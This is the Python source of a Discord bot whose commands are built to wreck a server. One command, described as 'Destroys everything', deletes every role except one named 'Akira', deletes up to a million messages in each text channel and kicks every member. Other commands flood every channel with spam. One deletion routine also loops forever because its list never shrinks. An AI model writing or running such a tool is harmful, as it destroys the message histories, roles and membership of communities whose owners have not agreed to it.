import discord
from discord.ext import commands
import random
import time

bot = commands.Bot(command_prefix='?', description='asdf')

@bot.event
async def on_ready():
    print('Logged in as ' + bot.user.name + ' ' + bot.user.id)


"""Destroys everything"""
@bot.command(pass_context = True)
async def resonate(ctxt):
    await deleteAllRoles(ctxt)
    await flushAllChannels(ctxt)
    await kickAllUsers(ctxt)

"""Deletes every message in a given channel"""
@bot.command(pass_context = True)
async def flushChannel(ctxt):
   messages = []
   async for message in bot.logs_from(ctxt.message.channel_mentions[0], limit = 1000000):
     messages.append(message)
   while len(messages) > 0:
     await bot.delete_messages(messages[0:99])

"""Deletes every message in a specific channel"""
async def flushSpecificChannel(channel):
   messages = []
   async for message in bot.logs_from(channel, limit = 1000000):
     messages.append(message)
   rate_limit_chunks = [messages[x:x+100] for x in range(0, len(messages), 100)]
   for chunk in rate_limit_chunks:
       await bot.delete_messages(chunk)

"""Deletes every message in every channel"""
@bot.command(pass_context = True)
async def flushAllChannels(ctxt):
  channels = ctxt.message.server.channels
  for c in channels:
    if (c.type == discord.ChannelType.text):
      await flushSpecificChannel(c)
      

"""Floods all channels with messages"""
@bot.command()
async def floodAllChannels():
    channels = bot.get_all_channels()
    for c in channels:
        if (c.type == discord.ChannelType.text):
            await floodChannel(c)


"""Floods specific channel with messages"""
async def floodChannel(channel):
    counter = 100
    while (counter > 0):
        await bot.send_message(channel,(str(counter)))
        counter -= 1

"""Deletes all roles in a server"""
@bot.command(pass_context = True)
async def deleteAllRoles(ctxt):
    server = ctxt.message.server
    roles = server.roles
    for role in roles:
        if (role.is_everyone == False and role.name != "Akira"):
            await deleteRole(server, role)

"""Delete a single role in a server"""
async def deleteRole(server, role):
    await bot.delete_role(server,role)

"""Kicks all kickable members in a server"""
@bot.command(pass_context = True)
async def kickAllUsers(ctxt):
    server = ctxt.message.server
    member_dict = server.members
    member_list = reversed(list(member_dict)) # To avoid mods/admins
    for member in member_list:
        await bot.kick(member)


bot.run('token')